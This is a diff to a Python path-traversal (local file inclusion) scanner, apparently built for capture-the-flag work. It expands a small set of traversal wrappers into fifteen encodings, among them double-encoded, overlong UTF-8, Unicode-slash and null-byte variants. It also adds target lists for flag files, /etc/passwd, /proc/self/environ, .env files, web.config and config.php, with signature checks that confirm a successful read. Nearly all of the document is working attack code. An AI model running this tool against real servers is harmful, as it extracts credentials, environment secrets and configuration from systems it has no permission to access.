@@ -3,9 +3,10 @@
 
 Start with a known-valid GET URL whose query string already contains a real file
 value. The helper preserves every other query field, calibrates a same-directory
-missing-file control, tests a bounded set of traversal wrappers, and reuses the
-exact winning wrapper and depth for common flag paths. When authentication is
-supplied it also compares the baseline and winning read anonymously.
+missing-file control, tests a bounded SecLists-derived Linux/Windows traversal
+matrix, and reuses the exact winning wrapper and depth for objective, environment,
+and application-config paths. When authentication is supplied it also compares
+the baseline and winning read anonymously.
 
 Exit codes: 0 flag or confirmed file read, 2 inconclusive/no confirmed read,
 3 rate-limit/gateway/request circuit break, 4 invalid arguments.
@@ -30,17 +31,78 @@ FLAG_RE = re.compile(
     r'(?<![A-Za-z0-9])(?:HTB|bug|flag|CTF|THM|PLab|picoCTF|RM|WEBVERSE)\{[^}]{3,120}\}',
     re.I)
 PASSWD_RE = re.compile(r'(?m)^root:[^:\r\n]*:0:0:')
+WININI_RE = re.compile(r'(?im)^\[(?:fonts|extensions|mci extensions|files)\]\s*$')
+PROC_STATUS_RE = re.compile(r'(?ms)^Name:\s+\S+.*?^Pid:\s+\d+')
+OS_RELEASE_RE = re.compile(r'(?m)^(?:NAME|ID)=["\x27]?[A-Za-z0-9]')
+WINDOWS_HOSTS_RE = re.compile(r'(?im)^\s*#?\s*(?:127\.0\.0\.1|::1)\s+localhost(?:\s|$)')
 NEGATIVE_RE = re.compile(
     r'(?:not found|no such file|enoent|invalid (?:file|path)|cannot (?:get|read|open)|'
     r'failed to (?:read|open)|outside (?:allowed|upload)|path (?:denied|rejected))', re.I)
 GATEWAY_FAILURES = {502, 503, 504}
 FILE_FIELDS = re.compile(
     r'^(?:file|filename|file_name|filepath|file_path|path|template|download)$', re.I)
-FLAG_PATHS = (
-    "/flag.txt", "/flag", "/root/flag.txt", "/home/user/flag.txt",
-    "/app/flag.txt", "/data/flag.txt", "/var/flag.txt",
+LINUX_TARGETS = (
+    "flag.txt", "flag", "root/flag.txt", "home/user/flag.txt", "home/ctf/flag.txt",
+    "app/flag.txt", "app/flag", "usr/src/app/flag.txt", "workspace/flag.txt",
+    "challenge/flag.txt", "data/flag.txt", "var/flag.txt",
+    "proc/self/environ", "proc/1/environ", "app/.env", "usr/src/app/.env",
+    "workspace/.env", "var/www/html/.env", "app/config.json",
+    "usr/src/app/config.json", "var/www/html/config.php",
 )
-STYLE_ORDER = ("plain", "four-dot", "double-encoded")
+WINDOWS_TARGETS = (
+    "flag.txt", "flag", "Users/Administrator/Desktop/flag.txt",
+    "Users/Public/Desktop/flag.txt", "Users/Default/Desktop/flag.txt",
+    "inetpub/wwwroot/flag.txt", "inetpub/wwwroot/flag", "xampp/htdocs/flag.txt",
+    "Windows/Temp/flag.txt", "ProgramData/flag.txt", "inetpub/wwwroot/web.config",
+    "inetpub/wwwroot/.env", "xampp/htdocs/.env", "xampp/htdocs/config.php",
+)
+LEGACY_SUFFIX_TARGETS = ("flag.txt%00", "flag.txt%00.jpg")
+
+# Curated from the pattern families represented in SecLists' LFI-Jhaddix and
+# Linux/Windows LFI lists. The raw lists contain malformed entries, log-poisoning
+# paths, and command payloads, so replaying all of them would violate this helper's
+# bounded, read-only contract.
+STYLE_SPECS = {
+    "plain": {"unit": "../", "platform": "linux", "separator": "/"},
+    "absolute-posix": {"unit": "/", "platform": "linux", "separator": "/",
+                       "absolute": True},
+    "four-dot": {"unit": "....//", "platform": "linux", "separator": "/"},
+    "double-slash": {"unit": "..//", "platform": "linux", "separator": "/"},
+    "slash-encoded": {"unit": "..%2f", "platform": "linux", "separator": "/"},
+    "double-encoded": {"unit": "..%252f", "platform": "linux", "separator": "/"},
+    "backslash": {"unit": "..\\", "platform": "windows", "separator": "\\"},
+    "absolute-windows": {"unit": "C:/", "platform": "windows", "separator": "/",
+                         "absolute": True},
+    "dot-encoded": {"unit": "%2e%2e%2f", "platform": "linux", "separator": "/"},
+    "double-full": {"unit": "%252e%252e%252f", "platform": "linux",
+                    "separator": "/"},
+    "backslash-encoded": {"unit": "..%5c", "platform": "windows",
+                          "separator": "%5c"},
+    "mixed-slash": {"unit": "..%2f%5c", "platform": "windows",
+                    "separator": "%5c"},
+    "overlong-slash": {"unit": "..%c0%af", "platform": "linux", "separator": "/"},
+    "unicode-slash": {"unit": "..%ef%bc%8f", "platform": "linux", "separator": "/"},
+    "unicode-backslash": {"unit": "..%ef%bc%bc", "platform": "windows",
+                          "separator": "%ef%bc%bc"},
+}
+CORE_STYLE_ORDER = (
+    "plain", "absolute-posix", "four-dot", "double-slash", "slash-encoded",
+    "double-encoded", "backslash", "absolute-windows",
+)
+EXTENDED_STYLE_ORDER = CORE_STYLE_ORDER + (
+    "dot-encoded", "double-full", "backslash-encoded", "mixed-slash",
+    "overlong-slash", "unicode-slash", "unicode-backslash",
+)
+STYLE_ORDER = tuple(STYLE_SPECS)
+ALTERNATE_CONFIRMATIONS = {
+    "linux": (
+        ("proc/self/status", PROC_STATUS_RE, "/proc/self/status"),
+        ("etc/os-release", OS_RELEASE_RE, "/etc/os-release"),
+    ),
+    "windows": (
+        ("Windows/System32/drivers/etc/hosts", WINDOWS_HOSTS_RE, "Windows hosts"),
+    ),
+}
 
 
 class Inconclusive(RuntimeError):
@@ -60,12 +122,29 @@ def unique(items):
 
 
 def wrapper(style, depth):
-    unit = {
-        "plain": "../",
-        "four-dot": "....//",
-        "double-encoded": "..%252f",
-    }[style]
-    return unit * depth
+    spec = STYLE_SPECS[style]
+    return spec["unit"] if spec.get("absolute") else spec["unit"] * depth
+
+
+def style_depths(style, max_depth):
+    return (0,) if STYLE_SPECS[style].get("absolute") else range(1, max_depth + 1)
+
+
+def render_target(style, depth, target):
+    spec = STYLE_SPECS[style]
+    rendered = target.replace("/", spec["separator"])
+    return wrapper(style, depth) + rendered
+
+
+def confirmation_for(style):
+    if STYLE_SPECS[style]["platform"] == "windows":
+        return "Windows/win.ini", WININI_RE, "Windows win.ini"
+    return "etc/passwd", PASSWD_RE, "/etc/passwd"
+
+
+def targets_for(style):
+    return (WINDOWS_TARGETS if STYLE_SPECS[style]["platform"] == "windows"
+            else LINUX_TARGETS)
 
 
 def shown(value, limit=140):
@@ -257,26 +336,26 @@ class LfiFastTrack:
         else:
             print("[-] winning read requires the supplied authentication")
 
-    def flag_sweep(self, style, depth, identity, already=None):
-        prefix = wrapper(style, depth)
+    def target_sweep(self, style, depth, identity, already=None):
         already = set(already or [])
-        for target in FLAG_PATHS:
-            raw_value = prefix + target.lstrip("/")
+        for target in targets_for(style):
+            raw_value = render_target(style, depth, target)
             if raw_value in already:
                 continue
-            response, hits = self.send("flag:%s" % target.lstrip("/").replace("/", "_"),
-                                       identity, raw_value)
+            response, hits = self.send(
+                "target:%s" % target.replace("/", "_").replace("\\", "_"),
+                identity, raw_value)
             if hits:
-                self.announce_flag(hits, style, depth, raw_value, identity, "flag-sweep")
+                self.announce_flag(hits, style, depth, raw_value, identity, "target-sweep")
                 return True
         return False
 
-    def compare_confirmed_anonymous(self, raw_value):
+    def compare_confirmed_anonymous(self, raw_value, signature):
         if self.preferred_identity == "anonymous":
             print("[+] confirmed traversal is anonymously reachable")
             return
         response, _ = self.send("confirm:anonymous", "anonymous", raw_value)
-        if PASSWD_RE.search(response.content.decode("utf-8", errors="replace")):
+        if signature.search(response.content.decode("utf-8", errors="replace")):
             print("[+] confirmed traversal is anonymously reachable")
         else:
             print("[-] confirmed traversal requires the supplied authentication")
@@ -318,32 +397,34 @@ class LfiFastTrack:
             raise Inconclusive(
                 "known-valid and missing-file responses are identical; baseline is not discriminating")
 
-        styles = self.args.style or list(STYLE_ORDER)
+        styles = self.args.style or list(
+            EXTENDED_STYLE_ORDER if self.args.profile == "extended" else CORE_STYLE_ORDER)
         for style in styles:
-            for depth in range(1, self.args.max_depth + 1):
-                prefix = wrapper(style, depth)
-                passwd_value = prefix + "etc/passwd"
+            confirm_target, confirm_signature, confirm_name = confirmation_for(style)
+            for depth in style_depths(style, self.args.max_depth):
+                confirm_value = render_target(style, depth, confirm_target)
                 response, hits = self.send(
-                    "probe:%s:d%d:passwd" % (style, depth),
-                    self.preferred_identity, passwd_value)
+                    "probe:%s:d%d:signature" % (style, depth),
+                    self.preferred_identity, confirm_value)
                 if hits:
                     self.announce_flag(
-                        hits, style, depth, passwd_value, self.preferred_identity, "passwd-probe")
-                    self.replay_anonymous(passwd_value, hits)
+                        hits, style, depth, confirm_value, self.preferred_identity,
+                        "signature-probe")
+                    self.replay_anonymous(confirm_value, hits)
                     return
 
                 text = response.content.decode("utf-8", errors="replace")
-                confirmed = bool(PASSWD_RE.search(text))
+                confirmed = bool(confirm_signature.search(text))
                 is_promising = self.promising(response, baseline, negative)
                 if confirmed:
-                    self.confirmed = (style, depth, passwd_value)
-                    print("[+] CONFIRMED file read: style=%s depth=%d (/etc/passwd signature)" % (
-                        style, depth))
+                    self.confirmed = (style, depth, confirm_value, confirm_name)
+                    print("[+] CONFIRMED file read: style=%s depth=%d (%s signature)" % (
+                        style, depth, confirm_name))
                 elif is_promising:
-                    self.possible.append((style, depth, passwd_value))
+                    self.possible.append((style, depth, confirm_value))
                     print("[?] traversal-shaped differential: %s" % shown(text))
 
-                direct_flag = prefix + "flag.txt"
+                direct_flag = render_target(style, depth, "flag.txt")
                 direct, direct_hits = self.send(
                     "probe:%s:d%d:flag" % (style, depth),
                     self.preferred_identity, direct_flag)
@@ -355,12 +436,66 @@ class LfiFastTrack:
                     return
 
                 if confirmed or is_promising:
-                    if self.flag_sweep(
+                    if self.target_sweep(
                             style, depth, self.preferred_identity, already=[direct_flag]):
                         self.replay_anonymous(self.found["raw_value"], self.found["flags"])
                         return
                 if confirmed:
-                    self.compare_confirmed_anonymous(passwd_value)
+                    self.compare_confirmed_anonymous(confirm_value, confirm_signature)
+                    return
+
+            # A filter may special-case passwd or win.ini. After the primary
+            # depth sweep, try a tiny signature-backed fallback set at the
+            # deepest/root-reaching form rather than multiplying every target
+            # across every depth and wrapper.
+            fallback_depth = 0 if STYLE_SPECS[style].get("absolute") else self.args.max_depth
+            if self.args.profile == "extended":
+                for legacy_target in LEGACY_SUFFIX_TARGETS:
+                    legacy_value = render_target(style, fallback_depth, legacy_target)
+                    _, hits = self.send(
+                        "legacy:%s:%s" % (style, legacy_target.replace("%", "pct")),
+                        self.preferred_identity, legacy_value)
+                    if hits:
+                        self.announce_flag(
+                            hits, style, fallback_depth, legacy_value,
+                            self.preferred_identity, "legacy-suffix-probe")
+                        self.replay_anonymous(legacy_value, hits)
+                        return
+            for fallback_target, fallback_signature, fallback_name in ALTERNATE_CONFIRMATIONS[
+                    STYLE_SPECS[style]["platform"]]:
+                fallback_value = render_target(style, fallback_depth, fallback_target)
+                response, hits = self.send(
+                    "fallback:%s:%s" % (
+                        style, fallback_target.replace("/", "_").replace("\\", "_")),
+                    self.preferred_identity, fallback_value)
+                if hits:
+                    self.announce_flag(
+                        hits, style, fallback_depth, fallback_value,
+                        self.preferred_identity, "signature-fallback")
+                    self.replay_anonymous(fallback_value, hits)
+                    return
+
+                text = response.content.decode("utf-8", errors="replace")
+                confirmed = bool(fallback_signature.search(text))
+                is_promising = self.promising(response, baseline, negative)
+                if confirmed:
+                    self.confirmed = (
+                        style, fallback_depth, fallback_value, fallback_name)
+                    print("[+] CONFIRMED file read: style=%s depth=%d (%s signature)" % (
+                        style, fallback_depth, fallback_name))
+                elif is_promising:
+                    self.possible.append((style, fallback_depth, fallback_value))
+                    print("[?] traversal-shaped differential: %s" % shown(text))
+
+                if confirmed or is_promising:
+                    direct_flag = render_target(style, fallback_depth, "flag.txt")
+                    if self.target_sweep(
+                            style, fallback_depth, self.preferred_identity,
+                            already=[direct_flag]):
+                        self.replay_anonymous(self.found["raw_value"], self.found["flags"])
+                        return
+                if confirmed:
+                    self.compare_confirmed_anonymous(fallback_value, fallback_signature)
                     return
 
         if self.possible:
@@ -381,10 +516,14 @@ def parse_args(argv=None):
     parser.add_argument("--header", action="append", default=[],
                         help="extra 'Name: Value' header; repeatable")
     parser.add_argument("--out", default="recon/lfiquick", help="evidence directory")
+    parser.add_argument(
+        "--profile", choices=("core", "extended"), default="core",
+        help="core is bounded and modern; extended adds legacy/Unicode/null-byte families")
     parser.add_argument("--style", action="append", choices=STYLE_ORDER, default=[],
                         help="limit traversal style; repeatable")
     parser.add_argument("--max-depth", type=int, default=6)
-    parser.add_argument("--max-probes", type=int, default=48)
+    parser.add_argument("--max-probes", type=int,
+                        help="request cap (default: 128 core, 260 extended)")
     parser.add_argument("--delay", type=float, default=0.12)
     parser.add_argument("--timeout", type=float, default=10.0)
     parser.add_argument("--allow-html-baseline", action="store_true",
@@ -396,10 +535,12 @@ def main(argv=None):
     runner = None
     try:
         args = parse_args(argv)
+        if args.max_probes is None:
+            args.max_probes = 260 if args.profile == "extended" else 128
         if not 1 <= args.max_depth <= 8:
             raise ValueError("--max-depth must be between 1 and 8")
-        if not 3 <= args.max_probes <= 80:
-            raise ValueError("--max-probes must be between 3 and 80")
+        if not 3 <= args.max_probes <= 300:
+            raise ValueError("--max-probes must be between 3 and 300")
         if args.delay < 0 or args.timeout <= 0:
             raise ValueError("--delay must be non-negative and --timeout must be positive")
         runner = LfiFastTrack(args)
